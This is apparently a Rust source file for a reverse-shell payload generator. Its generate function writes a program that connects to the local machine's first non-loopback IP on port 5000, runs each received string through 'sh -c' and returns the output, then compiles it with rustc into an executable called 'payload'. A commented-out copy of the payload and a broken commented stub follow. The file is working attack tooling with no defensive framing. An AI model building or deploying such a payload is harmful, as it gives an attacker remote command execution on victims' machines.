use get_if_addrs::get_if_addrs;
use std::fs;
use std::process::Command;

fn get_ip() -> Option<std::net::IpAddr> {
    match get_if_addrs() {
        Ok(interfaces) => {
            for iface in interfaces {
                if !iface.is_loopback() {
                    return Some(iface.ip());
                }
            }
            None
        }
        _ => {
            None
        }
    }
}

pub fn generate() {
    let mut source = String::new();
    let ip = get_ip();
    if let Some(ip) = ip {
        source = format!("use std::io::{{Read, Write}};
use std::net::TcpStream;
use std::process::Command;

pub fn main() {{
    if let Ok(mut stream) = TcpStream::connect(\"{}:5000\") {{
        loop {{
            let mut buffer = [0; 1024];
            if let Ok(n) = stream.read(&mut buffer) {{
                let cmd = String::from_utf8_lossy(&buffer[..n]);
                let output = Command::new(\"sh\")
                    .arg(\"-c\")
                    .arg(cmd.trim())
                    .output()
                    .unwrap();
                stream.write_all(&output.stdout).unwrap();
            }}
        }}
    }}
}}", ip);
    } else {
        eprintln!("No IP address provided.");
    }

    /*
    let source = "
use std::io::{Read, Write};\n
use std::net::TcpStream;\n
use std::process::Command;\n\n
pub fn main() {\n

    if let Ok(mut stream) = TcpStream::connect(\"{ip}:5000\") {\n
        loop {\n
            let mut buffer = [0; 1024];\n
            if let Ok(n) = stream.read(&mut buffer) {\n
                let cmd = String::from_utf8_lossy(&buffer[..n]);\n
                let output = Command::new(\"sh\")\n
                    .arg(\"-c\")\n
                    .arg(cmd.trim())\n
                    .output()\n
                    .unwrap();\n
                stream.write_all(&output.stdout).unwrap();\n
            }\n
        }\n
    }\n
}\n";
    */

    // Write source to file
    fs::write("payload.rs", source).expect("Failed to write source");

    // Compile using rustc
    let output = Command::new("rustc")
        .arg("payload.rs")
        .arg("-o")
        .arg("payload")
        .output()
        .expect("Failed to compile");

    if output.status.success() {
        println!("Executable generated!");
    } else {
        eprintln!("Error: {}", String::from_utf8_lossy(&output.stderr));
    }
}

/*
fn generate() -> io::Result<()> {
    let mut file = File::create("payload.rs")?; //make this variable based on the function argument
                ")?;
    Ok(())
}
*/
